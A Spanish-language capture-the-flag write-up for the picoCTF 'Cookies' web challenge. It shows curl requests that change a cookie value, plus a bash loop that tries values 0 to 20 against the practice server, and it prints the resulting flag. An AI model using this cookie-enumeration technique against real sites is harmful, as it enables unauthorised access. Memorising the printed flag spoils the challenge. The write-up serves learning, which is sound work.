## Descripción del reto
¿A quién no le encantan las galletas? Intenta descubrir cuál es el mejor. http://mercury.picoctf.net:21485/
## Pistas 
-
## Solución 
Para ello acudimos dando un curl al sitio con cierto determinado valor de la Cookie, por ejemplo yo probe con la 3, a ver que nos arroja:
$ curl http://mercury.picoctf.net:21485/check -H  "Cookie:name=3"
<!DOCTYPE html>
`<html lang="en">`

`<head>`
    `<title>Cookies</title>`


    `<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">`

    `<link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">`

    `<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>`

    `<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>`
`</head>`

`<body>`

    `<div class="container">`
        `<div class="header">`
            `<nav>`
                `<ul class="nav nav-pills pull-right">`
                    `<li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>`
                    `</li>`
                `</ul>`
            `</nav>`
            `<h3 class="text-muted">Cookies</h3>`
        `</div>`
        
        `<!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->`
        
        
        `<div class="alert alert-success alert-dismissible" role="alert" id="myAlert">`
          `<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>`
          `<!-- <strong>Title</strong> --> That is a cookie! Not very special though...`
            `</div>`
      
      
      
        `<div class="jumbotron">`
            `<p class="lead"></p>`
            `<p style="text-align:center; font-size:30px;"><b>I love gingersnap cookies!</b></p>`
        `</div>`


        `<footer class="footer">`
            `<p>&copy; PicoCTF</p>`
        `</footer>`

    `</div>`
    `<script>`
    `$(document).ready(function(){`
        `$(".close").click(function(){`
            `$("myAlert").alert("close");`
        `});`
    `});`
    `</script>`
`</body>`
Una vez ejecutamos el curl y comprobamos que esta efectivamente nos encuentra la cookie que seleccionamos de ejemplo, entonces para encontrar la correcta, hacemos lo siguiente: 
Mediante el ciclo for podemos recorrer posiciones, entonces en este caso vamos a recorrer 21 posiciones, desde el 0 al 20. Pero también hay que poner una pipa para poder juntar el comando 
grep, el cual nos va auxiliar de encontrar nuestra flag con la cadena "picoCTF":
<font style="color:green">for i in {0..20}; do curl -s http://mercury.picoctf.net:21485/check -H  "Cookie:name=$i"; done | grep picoCTF </font>
De esta manera se ciclará mediante las cookies, y nos permitirá encontrar una que nos arroje la correcta de mando con el comando grep.
─$ for i in {0..20}; do curl -s http://mercury.picoctf.net:21485/check -H  "Cookie:name=$i"; done | grep picoCTF
            `<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code></p>`
Una vez ejectuado nos manda la flag directamente.



## Contraseña obtenida 
picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}
## Notas 
Aquí aprendí a implementar el curl, junto con el grep además de que desconocia que se podía usar tambíen un ciclo for para poder recorrer distintas posiciones de alguna página.
## Referencias
https://www.educatica.es/sistemas-operativos/gnu-linux/trabajando-con-la-shell-de-gnu-linux/bash-shell-scripts/shell-scripts-bucle-for/#:~:text=El%20comando%20for%20nos%20permite,el%20primero%20hasta%20el%20%C3%BAltimo.
https://blogs.upm.es/estudiaciencia/bucles-y-condicionales/
https://www.hostinger.mx/tutoriales/bash-for-loop-guia-ejemplos
